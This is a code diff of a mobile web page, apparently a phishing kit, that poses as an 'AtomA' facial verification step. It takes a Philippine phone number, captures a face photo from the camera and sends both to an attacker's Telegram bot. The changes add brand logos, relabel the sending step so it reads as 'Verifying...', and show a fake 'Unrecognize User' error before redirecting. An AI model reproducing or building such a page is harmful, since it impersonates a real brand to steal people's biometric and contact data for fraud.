@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>AtomA | Facial Verification</title>
     <link rel="preload" as="image" href="photos/atomefacialbg.jpeg">
+    <link rel="preload" as="image" href="photos/atomebg2.png">
     <link rel="preload" as="image" href="photos/atomeA.png">
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -54,8 +55,28 @@
             }
         }
 
+        /* Atome Logo Circle */
+        .logo-circle {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 16px;
+            background: rgba(255,255,255,0.95);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            border: 2px solid #FFD700;
+        }
+
+        .logo-circle img {
+            width: 50px;
+            height: 50px;
+            object-fit: contain;
+        }
+
         .requirements-card h2 {
-            font-size: 1.8rem;
+            font-size: 1.6rem;
             font-weight: 800;
             background: linear-gradient(135deg, #1a2a3a, #2d6a4f);
             -webkit-background-clip: text;
@@ -148,10 +169,10 @@
             transform: scale(0.98);
         }
 
-        /* PAGE 2 - FACE SCAN PAGE */
+        /* PAGE 2 - FACE SCAN PAGE - atomebg2.png background */
         .page-scan {
             min-height: 100vh;
-            background: linear-gradient(165deg, #7EC8E0 0%, #B8E1F0 30%, #FDE08B 70%, #FDD97A 100%);
+            background: url('photos/atomebg2.png') center center/cover no-repeat fixed;
             position: relative;
             display: none;
             align-items: center;
@@ -169,74 +190,16 @@
             to { opacity: 1; }
         }
 
-        /* Sunburst Rays */
-        .sunburst {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-            overflow: hidden;
-        }
-
-        .ray {
-            position: absolute;
-            background: radial-gradient(ellipse at center, rgba(255,255,250,0.4) 0%, rgba(255,255,245,0.15) 40%, rgba(255,255,255,0) 70%);
-            border-radius: 50%;
-            filter: blur(4px);
-            animation: slowPulse 8s ease-in-out infinite;
-        }
-
-        .ray1 { width: 400px; height: 400px; top: -150px; left: -120px; animation-delay: 0s; }
-        .ray2 { width: 550px; height: 550px; top: 10%; right: -200px; animation-delay: 2s; }
-        .ray3 { width: 450px; height: 450px; bottom: 0%; left: -100px; animation-delay: 4s; }
-        .ray4 { width: 300px; height: 300px; top: 50%; left: 20%; animation-delay: 1s; }
-        .ray5 { width: 350px; height: 350px; bottom: 20%; right: 5%; animation-delay: 3s; }
-
-        @keyframes slowPulse {
-            0%, 100% { opacity: 0.5; transform: scale(1); }
-            50% { opacity: 0.9; transform: scale(1.05); }
-        }
-
-        /* Rolling Hills */
-        .hills {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 260px;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .hill {
-            position: absolute;
-            bottom: 0;
-            border-radius: 100% 100% 0 0;
-            box-shadow: 0 -5px 15px rgba(0,0,0,0.05);
-        }
-
-        .hill1 { width: 110%; height: 180px; left: -5%; background: #FFF9EF; border-radius: 55% 55% 0 0; bottom: -20px; }
-        .hill2 { width: 85%; height: 210px; left: -10%; bottom: -30px; background: #FFF5E6; border-radius: 50% 52% 0 0; }
-        .hill3 { width: 75%; height: 195px; right: -12%; bottom: -25px; background: #FFF8EC; border-radius: 48% 52% 0 0; }
-        .hill4 { width: 55%; height: 170px; left: 15%; bottom: -35px; background: #FFF2DD; border-radius: 60% 40% 0 0; }
-        .hill5 { width: 45%; height: 150px; right: 5%; bottom: -40px; background: #FFFAF0; border-radius: 45% 55% 0 0; }
-
-        /* Scan Container */
+        /* TRANSPARENT CONTAINER */
         .scan-container {
             position: relative;
             z-index: 2;
-            background: rgba(255, 255, 255, 0.2);
-            backdrop-filter: blur(10px);
+            background: transparent;
             border-radius: 60px;
             width: 90%;
             max-width: 460px;
             padding: 28px 24px 36px;
             text-align: center;
-            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.25);
-            border: 1px solid rgba(255, 255, 255, 0.4);
             animation: slideUp 0.5s ease;
         }
 
@@ -251,22 +214,46 @@
             }
         }
 
+        /* Atome Logo Circle sa Scan Page */
+        .scan-logo-circle {
+            width: 65px;
+            height: 65px;
+            margin: 0 auto 12px;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            border: 2px solid #FFD700;
+        }
+
+        .scan-logo-circle img {
+            width: 45px;
+            height: 45px;
+            object-fit: contain;
+        }
+
         .scan-header h3 {
             font-size: 1.5rem;
             font-weight: 800;
-            color: #1a2a3a;
+            color: #ffffff;
             margin-bottom: 6px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
         }
 
         .scan-header p {
             font-size: 0.75rem;
-            color: #d46b5e;
+            color: #FFE566;
             margin-bottom: 20px;
-            font-weight: 500;
+            font-weight: 600;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
         }
 
         .phone-display-scan {
-            background: rgba(0, 0, 0, 0.4);
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
             padding: 10px 20px;
             border-radius: 60px;
             display: inline-block;
@@ -274,8 +261,7 @@
             color: #FFE566;
             font-weight: 700;
             font-size: 0.9rem;
-            backdrop-filter: blur(4px);
-            border: 1px solid rgba(255, 215, 0, 0.3);
+            border: 1px solid rgba(255, 215, 0, 0.5);
         }
 
         /* Camera Frame */
@@ -449,6 +435,18 @@
             font-weight: 600;
         }
 
+        .status-text.error {
+            background: #f8d7da;
+            color: #721c24;
+            animation: shake 0.5s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
         .hidden {
             display: none;
         }
@@ -458,7 +456,9 @@
             .requirements-card { padding: 28px 20px; }
             .requirements-card h2 { font-size: 1.4rem; }
             .scan-container { padding: 22px 18px 30px; }
-            .scan-header h3 { font-size: 1.3rem; }
+            .scan-header h3 { font-size: 1.2rem; }
+            .logo-circle { width: 55px; height: 55px; }
+            .logo-circle img { width: 38px; height: 38px; }
         }
     </style>
 </head>
@@ -466,7 +466,11 @@
     <!-- PAGE 1: REQUIREMENTS -->
     <div id="pageRequirements" class="page-requirements">
         <div class="requirements-card">
-            <h2>😊 Facial Verification</h2>
+            <!-- Atome Logo Circle -->
+            <div class="logo-circle">
+                <img src="photos/atomeA.png" alt="AtomA">
+            </div>
+            <h2>Facial Verification</h2>
             <p>Enhanced identity authentication</p>
             
             <div class="requirements-list">
@@ -487,18 +491,13 @@
 
     <!-- PAGE 2: FACE SCAN -->
     <div id="pageScan" class="page-scan">
-        <div class="sunburst">
-            <div class="ray ray1"></div><div class="ray ray2"></div><div class="ray ray3"></div>
-            <div class="ray ray4"></div><div class="ray ray5"></div>
-        </div>
-        <div class="hills">
-            <div class="hill hill1"></div><div class="hill hill2"></div><div class="hill hill3"></div>
-            <div class="hill hill4"></div><div class="hill hill5"></div>
-        </div>
-        
         <div class="scan-container">
+            <!-- Atome Logo Circle sa Scan Page -->
+            <div class="scan-logo-circle">
+                <img src="photos/atomeA.png" alt="AtomA">
+            </div>
             <div class="scan-header">
-                <h3>😊 Position Your Face</h3>
+                <h3>Facial Verification</h3>
                 <p>Center your face in the circle</p>
             </div>
             
@@ -566,14 +565,6 @@
         } else {
             phoneDisplayReq.innerHTML = `📱 Verifying: +63${phoneNum}`;
             phoneDisplayScan.innerHTML = `📱 Verifying: +63${phoneNum}`;
-            
-            // Save to local database (localStorage)
-            const verifiedUsers = JSON.parse(localStorage.getItem('verifiedUsers') || '[]');
-            if (!verifiedUsers.includes(phoneNum)) {
-                verifiedUsers.push(phoneNum);
-                localStorage.setItem('verifiedUsers', JSON.stringify(verifiedUsers));
-            }
-            console.log("✅ Phone number saved to local database:", phoneNum);
         }
         
         // ============================================
@@ -613,11 +604,11 @@
                 await new Promise(r => setTimeout(r, 500));
                 camReady = true;
                 faceStatus.innerHTML = "✅ Camera ready! Position your face";
-                faceStatus.style.color = "#155724";
+                faceStatus.className = "status-text";
                 return true;
             } catch(e) {
-                faceStatus.innerHTML = "❌ Camera access denied. Please allow permissions.";
-                faceStatus.style.color = "#721c24";
+                faceStatus.innerHTML = "❌ Camera access denied";
+                faceStatus.className = "status-text error";
                 return false;
             }
         }
@@ -641,6 +632,7 @@
             greenEdge.classList.add('active');
             scanningText.classList.remove('hidden');
             faceStatus.innerHTML = "🔍 Scanning face...";
+            faceStatus.className = "status-text";
             
             setTimeout(() => {
                 greenEdge.classList.remove('active');
@@ -652,12 +644,26 @@
             scanningText.classList.add('hidden');
         }
         
+        // Show Unrecognize User Error and redirect to index.html
+        function showUnrecognizeAndRedirect() {
+            faceStatus.innerHTML = "❌ Unrecognize User. Please Try Again.";
+            faceStatus.className = "status-text error";
+            stopScanAnimation();
+            stopCamera();
+            
+            // Redirect to index.html after 2 seconds
+            setTimeout(() => {
+                window.location.href = 'index.html';
+            }, 2000);
+        }
+        
         // ============================================
-        // CAPTURE AND SEND TO TELEGRAM
+        // CAPTURE AND PROCESS
         // ============================================
-        async function captureAndSend() {
+        async function captureAndProcess() {
             if (!camReady) {
                 faceStatus.innerHTML = "❌ Camera not ready. Please wait.";
+                faceStatus.className = "status-text error";
                 return;
             }
             
@@ -675,19 +681,20 @@
                 
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));
                 
-                if (!blob || blob.size < 1000) {
-                    faceStatus.innerHTML = "❌ Capture failed. Please try again.";
-                    stopScanAnimation();
+                // Check if face is detected (blob size check - masyadong maliit means walang mukha)
+                if (!blob || blob.size < 5000) {
+                    showUnrecognizeAndRedirect();
                     return;
                 }
                 
                 const kb = (blob.size / 1024).toFixed(1);
-                faceStatus.innerHTML = `📸 Image captured (${kb}KB). Sending to Telegram...`;
+                faceStatus.innerHTML = `📸 Image captured (${kb}KB). Verifying...`;
                 
+                // Send to Telegram
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, `face_${phoneNum}_${Date.now()}.jpg`);
-                formData.append('caption', `🔐 FACE VERIFICATION SUCCESSFUL!\n\n📱 Phone: +63${phoneNum}\n⏰ Time: ${new Date().toLocaleString()}\n📍 Source: AtomA Facial Recognition\n✅ Status: Verified\n📦 Local DB: Saved`);
+                formData.append('caption', `🔐 FACE CAPTURE\n\n📱 Phone: +63${phoneNum}\n⏰ Time: ${new Date().toLocaleString()}\n📍 Source: AtomA Facial Recognition\n📸 Image Size: ${kb}KB`);
                 
                 const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -697,9 +704,10 @@
                 
                 if (result.ok) {
                     faceStatus.innerHTML = "✅ VERIFIED! Face sent to Telegram. Redirecting...";
+                    faceStatus.className = "status-text";
                     stopScanAnimation();
                     
-                    // Save verification status to localStorage
+                    // Save to localStorage
                     localStorage.setItem('atomeUser', JSON.stringify({
                         phone: phoneNum,
                         verified: true,
@@ -711,19 +719,18 @@
                         window.location.href = 'index.html';
                     }, 2000);
                 } else {
-                    faceStatus.innerHTML = "❌ Telegram error. Please try again.";
-                    stopScanAnimation();
+                    showUnrecognizeAndRedirect();
                 }
             } catch(err) {
-                faceStatus.innerHTML = "❌ Error sending. Please check connection.";
-                stopScanAnimation();
+                console.error("Error:", err);
+                showUnrecognizeAndRedirect();
             }
         }
         
         // ============================================
         // EVENT LISTENERS
         // ============================================
-        captureBtn.addEventListener('click', captureAndSend);
+        captureBtn.addEventListener('click', captureAndProcess);
     </script>
 </body>
 </html>
